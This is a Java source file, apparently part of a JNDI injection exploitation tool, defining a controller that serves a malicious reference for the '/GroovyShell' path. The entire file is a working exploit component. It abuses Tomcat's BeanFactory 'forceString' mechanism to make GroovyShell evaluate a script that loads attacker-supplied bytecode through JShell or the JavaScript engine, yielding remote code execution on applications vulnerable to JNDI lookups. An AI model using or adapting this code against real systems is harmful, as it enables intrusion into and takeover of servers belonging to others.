package map.jndi.controller.bypass;

import map.jndi.Main;
import map.jndi.annotation.JNDIController;
import map.jndi.annotation.JNDIMapping;
import map.jndi.controller.BasicController;
import map.jndi.payload.JShellPayload;
import map.jndi.payload.JavaScriptPayload;
import org.apache.naming.ResourceRef;

import javax.naming.StringRefAddr;

@JNDIController
@JNDIMapping("/GroovyShell")
public class GroovyShellController extends BasicController {
    @Override
    public Object process(byte[] byteCode) {
        System.out.println("[Reference] Factory: BeanFactory + GroovyShell");

        ResourceRef ref = new ResourceRef("groovy.lang.GroovyShell", null, "", "", true, "org.apache.naming.factory.BeanFactory", null);
        ref.add(new StringRefAddr("forceString", "x=evaluate"));

        if (Main.config.jshell) {
            String code = JShellPayload.loadClass(byteCode);
            String script = "Class.forName(\"jdk.jshell.JShell\").getMethod(\"create\").invoke(null).eval(\"" + code.replace("\"", "\\\"") + "\")";
            ref.add(new StringRefAddr("x", script));
        } else {
            String code = JavaScriptPayload.loadClass(byteCode);
            String script = "Class.forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"" + code + "\");";
            ref.add(new StringRefAddr("x", script));
        }

        return ref;
    }
}
